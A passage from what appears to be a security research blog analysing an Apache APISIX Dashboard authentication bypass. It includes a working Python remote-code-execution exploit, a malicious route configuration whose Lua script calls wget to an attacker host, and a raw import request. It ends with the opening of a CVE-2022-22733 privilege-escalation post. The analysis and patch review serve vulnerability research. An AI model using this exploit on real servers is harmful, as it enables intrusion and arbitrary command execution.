&lt;p&gt;Here we can see clearly that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wrapped&lt;/code&gt; one give us a response that we are unauthorized. BUt, the second one which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/apisix/admin/migrate/export&lt;/code&gt; route exported us the current configuration of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;dynamic-analysis&quot;&gt;&lt;strong&gt;Dynamic Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, It’s time for dynamic analysis. First, for debugging go applications we need to download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delve&lt;/code&gt; debugger. You can follow the installation guide from &lt;a href=&quot;https://github.com/go-delve/delve/tree/master/Documentation/installation&quot;&gt;here&lt;/a&gt;. Let’s now build the dashboard on our local machine to debug it. First we would need the following packages before we start building &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang-go&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yarn&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodejs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etcd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install golang-go yarn nodejs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And for installing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ectd&lt;/code&gt; follow the installation guide from &lt;a href=&quot;https://etcd.io/docs/v3.4/install/&quot;&gt;here&lt;/a&gt;. After the packages get installed let’s download our vulnerable version:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone -b release/2.9.0 https://github.com/apache/apisix-dashboard.git &amp;amp;&amp;amp; cd apisix-dashboard
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that run the following command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo make build&lt;/code&gt; to build the app dashboard. After it’s finished Let’s go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt; directory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1d4a5b17b39d368d99530b849c1164eb&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manager-api&lt;/code&gt; which is the dashboard app. Now, It’s time to execute the app using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delve&lt;/code&gt; to debug it remote;y from our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GoLand&lt;/code&gt; IDE. You can find &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delve&lt;/code&gt; binary under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go/bin&lt;/code&gt; directory under your linux user home. Let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delve&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo /home/kali/go/bin/dlv -l=:2345 --headless=true --api-version=2 --log=true exec ./manager-api
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delve&lt;/code&gt; to execute the app and listen for debugging session on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2345&lt;/code&gt; as we can see:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/35ba9a7d00ae4960f26b704dc17e141b&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Let’s connect to the debugger session on our IDE, go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Run&lt;/code&gt; Tab and then click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Edit Configurations&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/b806b473d338278a5467104a2d2b5a12&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then Click on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; add sign and choose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Go Remote&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3a950243e6c9972efc1b1923b3573d96&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And Name it as you want &amp;amp; configure the remote debugger, By adding the machine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP&lt;/code&gt;, Debugging port which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2345&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/507eceecac814bd034b0bd574afab99d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OK&lt;/code&gt; and you can see that our remote debugger is configured:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/92b32a966604ab4b45f24cc05f9934a8&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s time to set a breakpoints, First we will set a breakpoint to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wrapped&lt;/code&gt; route and take a look how the app deal with it &amp;amp; then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;un-wrapped&lt;/code&gt; one to see the difference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d3e4540d9879c8f4b8267b84db3f7c29&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see our debugger is running, Let’s debug our code and see how it will apply route for each one. While we stepping over under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; which is a pointer for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;route&lt;/code&gt; we can see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tress&lt;/code&gt; which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin.methoidTrees&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/43c916f9b6ec027a82587de336522fdd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Under it we can see integer values and each number is carrying all the different routes according to the methods&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/c9b66831e2f7feb2cb4e28eac50de5cc&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see see that each the 5 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; methods are exist and under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; of each one, We can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;children&lt;/code&gt; tab which contains the exact routes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8a209c5e59830ae857724d09e58f9302&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see the routes also stored inside it. Now, As we saw the way of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ApplyRoute&lt;/code&gt; and how it’s applying routes to initialize it, Let’s see how the difference between the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wrapped&lt;/code&gt; route and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;un-wrapped&lt;/code&gt; route on the loading. But, This time we will add the breakpoint under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wrap&lt;/code&gt; function from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin&lt;/code&gt; framework:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dfde035d844b316319a55d10d2c07c8c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After setting our breakpoint let’s run our debugger again and moving step by step until we arrive to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wrap&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/43fcdcb967ecfcbbb3e0034c6fb4072c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here as we can see when the breakpoint of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wraps&lt;/code&gt; funtion got hit it started to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wraps&lt;/code&gt; it and apply the middleware to it and as the following 2 routes are not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wrapped&lt;/code&gt; the authentication can be bypassed as it’s gonna apply and execute it without &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wrapping&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r.GET(&quot;/apisix/admin/migrate/export&quot;, h.ExportConfig)
r.POST(&quot;/apisix/admin/migrate/import&quot;, h.ImportConfig)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, How the vulnerable routes can be exploited ?. As we mentioned before that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/apisix/admin/migrate/export&lt;/code&gt; used to export the current configurations, The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/apisix/admin/migrate/import&lt;/code&gt; used to import configurations. And &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; is supporting execution of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lua&lt;/code&gt; scripts then, we can send a request of a malicious route that executes a command then request it. The configuration file is as the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cc29035b024f7a8d1bb2ed6271cb62f0&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It contains an array of routes, each with an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ID&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URIs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;methods&lt;/code&gt;, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lua&lt;/code&gt; script. Additionally, there is an array of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upstreams&lt;/code&gt;, each with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scheme&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeout&lt;/code&gt;. Also arrays for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;consumers&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;services&lt;/code&gt;, SSLs, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;global plugins&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugin configs&lt;/code&gt;. Now, Let’s get our malicious configration ready:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;Counsumers&quot;:[],&quot;Routes&quot;:[{&quot;id&quot;:&quot;387796883096994503&quot;,&quot;create_time&quot;:1640674554,&quot;update_time&quot;:1640677637,&quot;uris&quot;:[&quot;/rce&quot;],&quot;name&quot;:&quot;rce&quot;,&quot;methods&quot;:[&quot;GET&quot;,&quot;POST&quot;,&quot;PUT&quot;,&quot;DELETE&quot;,&quot;PATCH&quot;,&quot;HEAD&quot;,&quot;OPTIONS&quot;,&quot;CONNECT&quot;,&quot;TRACE&quot;],&quot;script&quot;:&quot;os.execute('wget http://172.16.69.246:8000/Pwn3d')&quot;,&quot;script_id&quot;:&quot;387796883096994503&quot;,&quot;upstream_id&quot;:&quot;387796832866009799&quot;,&quot;status&quot;:1}],&quot;Services&quot;:[],&quot;SSLs&quot;:[],&quot;Upstreams&quot;:[{&quot;id&quot;:&quot;387796832866009799&quot;,&quot;create_time&quot;:1640674524,&quot;update_time&quot;:1640674524,&quot;nodes&quot;:[{&quot;host&quot;:&quot;localhost&quot;,&quot;1337&quot;:,&quot;weight&quot;:1}],&quot;timeout&quot;:{&quot;connect&quot;:6,&quot;read&quot;:6,&quot;send&quot;:6},&quot;type&quot;:&quot;roundrobin&quot;,&quot;scheme&quot;:&quot;http&quot;,&quot;pass_host&quot;:&quot;pass&quot;,&quot;name&quot;:&quot;testUpstream&quot;}],&quot;GlobalPlugins&quot;:[],&quot;PluginConfigs&quot;:[]}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically, Here we set a route named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/rce&lt;/code&gt; and it accepts all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; methods &amp;amp; Then, Under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script&lt;/code&gt; key we put the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lua&lt;/code&gt; script as a command system to be executed, In this case it’s gonna request our the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d&lt;/code&gt; endpoint from our http server.&lt;/p&gt;

&lt;p&gt;Normal Request:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /apisix/admin/migrate/import HTTP/1.1
Host: 172.16.69.246:9000
User-Agent: UserAgents
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 995
Content-Type: multipart/form-data; boundary=d63fe4d72d026b3884925933bababb59

--d63fe4d72d026b3884925933bababb59
Content-Disposition: form-data; name=&quot;mode&quot;

overwrite
--d63fe4d72d026b3884925933bababb59
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test&quot;

{&quot;Counsumers&quot;: [], &quot;Routes&quot;: [{&quot;id&quot;: &quot;387796883096994503&quot;, &quot;create_time&quot;: 1640674554, &quot;update_time&quot;: 1640677637, &quot;uris&quot;: [&quot;/rce&quot;], &quot;name&quot;: &quot;rce&quot;, &quot;methods&quot;: [&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;, &quot;PATCH&quot;, &quot;HEAD&quot;, &quot;OPTIONS&quot;, &quot;CONNECT&quot;, &quot;TRACE&quot;], &quot;script&quot;: &quot;os.execute('wget http://172.16.69.246:8000/Pwn3d')&quot;, &quot;script_id&quot;: &quot;387796883096994503&quot;, &quot;upstream_id&quot;: &quot;387796832866009799&quot;, &quot;status&quot;: 1}], &quot;Services&quot;: [], &quot;SSLs&quot;: [], &quot;Upstreams&quot;: [{&quot;id&quot;: &quot;387796832866009799&quot;, &quot;create_time&quot;: 1640674524, &quot;update_time&quot;: 1640674524, &quot;nodes&quot;: [{&quot;host&quot;: &quot;10.18.134.63&quot;, &quot;port&quot;: 58344, &quot;weight&quot;: 1}], &quot;timeout&quot;: {&quot;connect&quot;: 6, &quot;read&quot;: 6, &quot;send&quot;: 6}, &quot;type&quot;: &quot;roundrobin&quot;, &quot;scheme&quot;: &quot;http&quot;, &quot;pass_host&quot;: &quot;pass&quot;, &quot;name&quot;: &quot;testUpstream&quot;}], &quot;GlobalPlugins&quot;: [], &quot;PluginConfigs&quot;: []}6ó
--d63fe4d72d026b3884925933bababb59--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is our python code to send the request:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import requests
import json
import zlib

url = &quot;http://172.16.69.246:9000&quot;
gateway_url = &quot;http://172.16.69.246:9080&quot;
cmd = &quot;wget http://172.16.69.246:8000/Pwn3d&quot;

def exploit(url, gateway_url, cmd):
    payload, err = gen(cmd)
    if err is not None:
        print(err)
        return
    create_route(payload, url)
    request_endpoint(gateway_url)

def request_endpoint(gateway_url):
    res = requests.get(gateway_url + &quot;/rce&quot;)
    print(res.text)

def create_route(payload, url):
    files = {
        'file': ('test', payload)
    }
    data = {
        'mode': 'overwrite'
    }
    res = requests.post(url + '/apisix/admin/migrate/import', files=files, data=data)
    print(res.text)

def gen(cmd):
    data = {
        &quot;Counsumers&quot;: [],
        &quot;Routes&quot;: [
            {
                &quot;id&quot;: &quot;387796883096994503&quot;,
                &quot;create_time&quot;: 1640674554,
                &quot;update_time&quot;: 1640677637,
                &quot;uris&quot;: [&quot;/rce&quot;],
                &quot;name&quot;: &quot;rce&quot;,
                &quot;methods&quot;: [
                    &quot;GET&quot;,
                    &quot;POST&quot;,
                    &quot;PUT&quot;,
                    &quot;DELETE&quot;,
                    &quot;PATCH&quot;,
                    &quot;HEAD&quot;,
                    &quot;OPTIONS&quot;,
                    &quot;CONNECT&quot;,
                    &quot;TRACE&quot;
                ],
                &quot;script&quot;: f&quot;os.execute('{cmd}')&quot;,
                &quot;script_id&quot;: &quot;387796883096994503&quot;,
                &quot;upstream_id&quot;: &quot;387796832866009799&quot;,
                &quot;status&quot;: 1
            }
        ],
        &quot;Services&quot;: [],
        &quot;SSLs&quot;: [],
        &quot;Upstreams&quot;: [
            {
                &quot;id&quot;: &quot;387796832866009799&quot;,
                &quot;create_time&quot;: 1640674524,
                &quot;update_time&quot;: 1640674524,
                &quot;nodes&quot;: [
                    {
                        &quot;host&quot;: &quot;localhost&quot;,
                        &quot;port&quot;: 1337,
                        &quot;weight&quot;: 1
                    }
                ],
                &quot;timeout&quot;: {
                    &quot;connect&quot;: 6,
                    &quot;read&quot;: 6,
                    &quot;send&quot;: 6
                },
                &quot;type&quot;: &quot;roundrobin&quot;,
                &quot;scheme&quot;: &quot;http&quot;,
                &quot;pass_host&quot;: &quot;pass&quot;,
                &quot;name&quot;: &quot;testUpstream&quot;
            }
        ],
        &quot;GlobalPlugins&quot;: [],
        &quot;PluginConfigs&quot;: []
    }

    json_data = json.dumps(data).encode('utf-8')
    checksum = zlib.crc32(json_data).to_bytes(4, byteorder='big')
    content = json_data + checksum

    import_data = content[:-4]
    checksum2 = int.from_bytes(content[-4:], byteorder='big')
    if checksum2 != zlib.crc32(import_data):
        return None, &quot;Checksum check failure,maybe file broken&quot;

    return content, None

exploit(url, gateway_url, cmd)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now let’s try to execute or code and check it out:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d84b6cc540da7630f7d567a08c17839b&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;patch-diffing&quot;&gt;&lt;strong&gt;Patch Diffing&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, Let’s take a look at the patch that used to prevent the vulnerability, We can see the patch information on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;github&lt;/code&gt;from &lt;a href=&quot;https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd?diff=split&quot;&gt;here&lt;/a&gt;. The changes applied to a lot of files, So we will be focusing on the important ones.&lt;/p&gt;

&lt;h3 id=&quot;apiinternalcoreserverhttpgo&quot;&gt;api/internal/core/server/http.go&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ba6d3e7b54e1a5925538c309575d92a5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticationMiddleware&lt;/code&gt; middleware from the filter package was removed and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ErrorTransformMiddleware&lt;/code&gt; middleware from the handler package was added as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ErrorTransformMiddleware&lt;/code&gt; middleware from the handler package may be more suitable for catching errors.&lt;/p&gt;

&lt;h3 id=&quot;apiinternalfilterauthenticationgo&quot;&gt;api/internal/filter/authentication.go&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/89e51847d4119b187e61c8dc1a39138d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see the new implementation uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin.Context&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;droplet.Context&lt;/code&gt; and basically, it’s refactoring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticationMiddleware&lt;/code&gt; into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin.HandlerFunc&lt;/code&gt; function. The changes done as the following,The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BaseMiddleware&lt;/code&gt; is no longer used ansd replaced with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin&lt;/code&gt; to handle the middleware stack, Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handle()&lt;/code&gt; method is replaced with a function which returns a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin.HandlerFunc&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authentication()&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpReq := ctx.Get(middleware.KeyHttpRequest)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;req := httpReq.(*http.Request)&lt;/code&gt; replaced with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c.Request&lt;/code&gt;. So, instead of retrieving the request object from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;droplet.Context&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctx.Get(middleware.KeyHttpRequest)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpReq.(*http.Request)&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.Request&lt;/code&gt; object is directly retrieved from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin.Context&lt;/code&gt; object using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c.Request&lt;/code&gt;. Also, the response object is replaced with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin.H&lt;/code&gt; object which is a shorthand for creating &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; responses.Finally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AbortWithStatusJSON()&lt;/code&gt; method is used to return the response with an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; status code.&lt;/p&gt;

&lt;h3 id=&quot;apiinternalroutego&quot;&gt;api/internal/route.go&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/e9645204b5dd0007ef5140b95bfb0f81&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here this change is to add authentication to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin&lt;/code&gt; application. By inserting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter.Authentication()&lt;/code&gt; middleware into the middleware chain and the application will first check if the user is authenticated before allowing them to access protected routes. If the user is not authenticated, they will receive an unauthorized response. If the user is authenticated, the middleware chain will continue to execute and the request will be handled normally.&lt;/p&gt;

&lt;p&gt;Finally, The other changes is for test cases like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upstream&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;route&lt;/code&gt; and so on.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;We analyzed the the vulnerability and highlited the root cause of it, We show it dynamically how the routes get initialized and Also how the wrapped ones get wrapped by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wraps()&lt;/code&gt; function to apply the middleware for it, And how the issue was caused by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin&lt;/code&gt; framework directly without Wrapping it when handling the routes of the configurations and finally, achieving RCE from it.&lt;/p&gt;

&lt;h1 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/apache/apisix-dashboard&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/apache/apisix-docker&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.jetbrains.com/go/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/go-delve/delve/tree/master/Documentation/installation&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://etcd.io/docs/v3.4/install/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://apisix.apache.org/docs/apisix/getting-started/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://apisix.apache.org/docs/dashboard/USER_GUIDE/&quot;&gt;https://apisix.apache.org/docs/dashboard/USER_GUIDE/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd#diff-a16bc2c469646367bf6d9f635ee85a8e13109732bdb0caba8cec71f015bc0c1c&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Exploit Writing: CVE-2022-22733 Privilege Escalation &amp;amp; RCE</title><link href="http://localhost:5000/security%20research/CVE_2022_22733_exploit/" rel="alternate" type="text/html" title="Exploit Writing: CVE-2022-22733 Privilege Escalation &amp; RCE" /><published>2023-05-01T00:00:00+08:00</published><updated>2023-05-01T00:00:00+08:00</updated><id>http://localhost:5000/security%20research/CVE_2022_22733_exploit</id><content type="html" xml:base="http://localhost:5000/security%20research/CVE_2022_22733_exploit/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In the previous blog from here, We have done analysis for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2022-22733&lt;/code&gt; and understand the root cause of the vulnerability &amp;amp; the issue in details. Now, It’s the time to develop an exploit for this vulnerability and take it more further than just escalating our privileges.&lt;/p&gt;

&lt;h1 id=&quot;the-exploit&quot;&gt;&lt;strong&gt;The Exploit&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;As we know from the analysis that to exploit the vulnerability, We need to perform the following steps:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Login with the low-privileged account.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Obtain the unsecure generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Decode the unsecure generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Parse the decoded data from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Retrieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account credentials from the parsed data.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Login with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account credentials and obtain a full privileges on the application.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

